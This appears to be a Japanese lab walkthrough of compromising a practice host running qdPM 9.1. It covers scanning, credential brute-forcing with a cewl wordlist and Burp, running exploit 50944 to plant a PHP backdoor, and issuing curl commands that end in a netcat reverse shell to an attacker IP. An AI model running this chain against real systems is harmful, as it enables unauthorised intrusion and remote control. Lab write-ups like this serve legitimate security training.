# 情報収集
## ポートスキャン
```bash
nmap 192.168.214.11 -p- --min-rate=20000
```

## サービススキャン
```bash
nmap 192.168.214.11 -p80 -sCV -A --min-rate=20000
```

## ディレクトリ列挙
```bash
gobuster dir -u http://192.168.214.11 -w /usr/share/wordlists/dirb/common.txt
```
projectというディレクトリが有り、ログインフォームがある

## ブラウザアクセス
- 会社概要から社員情報とメールアドレスを取得
- ログインフォームにはqdPM9.1の記載がある

## エクスプロイトの検索
```bash 
searchsploit qdPM 9.1
```
- 最新のエクスプロイトに50944.pyが見つかる
- 50944には有効なアカウント情報が必要

## 認証情報探索
### ユーザ名
メールアドレスのリストを作成
```txt
jeremy@AIDevCorp.org
alex@AIDevCorp.org
george@AIDevCorp.org
vincent@AIDevCorp.org
```
### パスワード
```bash
cewl http://192.168.214.11 -w AIDevCorp.org.txt
awk 'length($0) >=4' AIDevCorp.org.txt > AIDevCorp.org_pass.txt
```

### 有効なアカウントの探索
BurpSuiteのClusterbombで有効なアカウントを探索
- george@AIDevCorp.org:AIDevCorp

## エクスプロイト
```bash
python3 50944.py -url http://192.168.214.11/project/ --email george@AIDevCorp.org -p AIDevCorp
```

```bash
# whoami
curl http://192.168.214.11/project/uploads/users/311641-backdoor.php?cmd=whoami

# which nc
curl http://192.168.214.11/project/uploads/users/311641-backdoor.php?cmd="which nc"

OR

curl http://192.168.50.11/project/uploads/users/420919-backdoor.php --data-urlencode "cmd=which nc"

# nc 192.168.214.11 4444 -e /bin/bash
curl http://192.168.214.11/project/uploads/users/311641-backdoor.php?cmd="nc%20192.168.45.192%204444%20-e%20/bin/bash"

OR

curl http://192.168.50.11/project/uploads/users/420919-backdoor.php --data-urlencode "cmd=nc -nv 192.168.45.192 4444 -e /bin/bash"
```